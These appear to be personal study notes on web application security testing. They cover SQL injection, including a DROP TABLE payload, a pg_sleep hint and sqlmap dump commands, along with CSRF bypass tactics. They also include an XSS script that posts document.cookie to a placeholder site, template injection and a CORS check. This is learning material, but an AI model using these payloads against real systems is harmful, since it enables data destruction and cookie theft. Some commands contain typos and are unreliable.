how to show tables
Open XAMPP Control Panel

Make sure MySQL is started

Click the Shell button in XAMPP (or open Command Prompt)

Enter:

bash
Copy
Edit
mysql -u root -p
By default, XAMPP sets no password for root, so just press Enter



sql injection example:
What Does a Prepared Statement Do?
A prepared statement is a secure way to execute SQL queries that include user input.

 Why use it?
Prevents SQL Injection

Without it, a hacker can inject malicious SQL via forms (e.g., DROP TABLE).

Prepared statements separate the SQL logic from user input.

Faster for repeated queries

SQL is parsed once, and variables are sent later â€” more efficient for loops.

 Example: Without Prepared Statement  (Vulnerable)
php
Copy
Edit
$sql = "INSERT INTO users (name) VALUES ('$username')";
If someone enters:

vbnet
Copy
Edit
Youssef'); DROP TABLE users; --
It becomes:

sql
Copy
Edit
INSERT INTO users (name) VALUES ('Youssef'); DROP TABLE users; --');

This could delete the table.

you can send to the request in the trackingId ---> || pgsleep() 


arjun ----> tool tries to find the params in the link
param miner extension


Add the request in a file named for example req.txt then run this cmd:python sqlmap.py -r "C:\Users\Youssef Dieaa\Downloads\req.txt"

arjun, python sqlmap.py -u " " --data "id=1" --dumb-all


Cross-site request forgery (CSRF)




in case you faced CSRF ----- Options to do (update email or any data in general)

1. remove CSRF

2. Give same value length of chars

3. change method from POST to GET


XSS Payloads: sending data ( search data, entering data) ---> make view selection source to see your data & search for input data you sent
send alerts    (xss report)


<script>
 fetch('website',{
method:'post',
mode:'no-cors',
body:document.cookie}):
</script>
{{9*9}} ---> may cause 81 as result this called template injection




CROS: the concept is to request that has sensitive data and add to the request for example: Origin: https://ayhaga.com
if the response contains access control and the sensitive data so this security issue.
